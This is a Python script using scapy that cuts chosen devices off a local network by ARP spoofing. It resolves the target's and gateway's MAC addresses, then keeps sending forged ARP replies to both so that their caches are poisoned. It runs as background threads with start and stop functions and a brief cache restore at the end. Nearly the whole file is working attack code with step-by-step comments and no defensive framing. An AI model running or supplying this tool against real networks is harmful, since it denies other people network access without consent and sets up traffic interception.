import scapy.all as scapy
import time
import threading
import socket
import os

# Tracks active blocking threads
active_blocks = {}

def get_best_interface():
    """
    Finds the network interface that actually has internet.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        for iface in scapy.get_if_list():
            iface_ip = scapy.get_if_addr(iface)
            if iface_ip == local_ip:
                # print(f"✅ Using Interface: {iface} ({local_ip})")
                return iface
        return scapy.conf.iface
    except Exception as e:
        print(f"Interface Error: {e}")
        return scapy.conf.iface

def get_mac_address(ip, iface):
    """
    Robust way to find MAC address. 
    """
    mac = scapy.getmacbyip(ip)
    if mac:
        return mac

    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/arp_request
        answered = scapy.srp(packet, timeout=2, verbose=False, iface=iface)[0]
        
        if answered:
            return answered[0][1].hwsrc
    except Exception as e:
        print(f"MAC Lookup Error: {e}")
    
    return None

def get_gateway_ip():
    """Finds the Router IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        ip_parts = local_ip.split('.')
        return f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
    except:
        return "192.168.0.1" 

# --- 🛠️ FIX IS HERE ---
def spoof(target_ip, spoof_ip, target_mac, iface):
    """
    Sends the fake packet.
    Uses sendp (Layer 2) with an Ether header to fix warnings.
    """
    try:
        # 1. Create the Ethernet Frame (Layer 2)
        eth_layer = scapy.Ether(dst=target_mac)
        
        # 2. Create the ARP Packet (Layer 3)
        # op=2 means "ARP Reply" (I am this IP!)
        arp_layer = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        
        # 3. Stack them (Ether / ARP)
        packet = eth_layer / arp_layer
        
        # 4. Send using sendp (Layer 2 send)
        scapy.sendp(packet, verbose=False, iface=iface)
        return True
    except Exception as e:
        print(f"Packet Send Error: {e}")
        return False

def run_block_loop(target_ip, gateway_ip):
    iface = get_best_interface()
    
    print(f"🔍 Resolving MAC for {target_ip}...")
    target_mac = get_mac_address(target_ip, iface)
    
    if not target_mac:
        print(f"❌ FAILED: Could not find MAC address for {target_ip}. Device might be offline.")
        active_blocks[target_ip] = False
        return

    print(f"🚫 BLOCKING STARTED on {target_ip} [{target_mac}] via {gateway_ip}")
    
    gateway_mac = get_mac_address(gateway_ip, iface)

    while active_blocks.get(target_ip, False):
        # 1. Fool the Target: "I am the Router"
        spoof(target_ip, gateway_ip, target_mac, iface)
        
        # 2. Fool the Router: "I am the Target"
        if gateway_mac:
            spoof(gateway_ip, target_ip, gateway_mac, iface)
        
        time.sleep(1) # Slightly slower to avoid network flooding
        
    print(f"✅ BLOCKING STOPPED: {target_ip}")
    
    # --- 🛠️ FIX FOR CLEANUP TOO ---
    try:
        real_mac = scapy.getmacbyip(gateway_ip)
        if real_mac:
            # Construct proper Layer 2 restore packet
            eth_layer = scapy.Ether(dst=target_mac)
            arp_layer = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=real_mac)
            restore_packet = eth_layer / arp_layer
            
            print("RESTORING CONNECTION...")
            scapy.sendp(restore_packet, count=5, verbose=False, iface=iface)
    except:
        pass

def start_blocking(target_ip):
    if active_blocks.get(target_ip):
        print(f"⚠️ Already blocking {target_ip}")
        return
        
    gateway_ip = get_gateway_ip()
    active_blocks[target_ip] = True
    
    t = threading.Thread(target=run_block_loop, args=(target_ip, gateway_ip))
    t.daemon = True
    t.start()

def stop_blocking(target_ip):
    active_blocks[target_ip] = False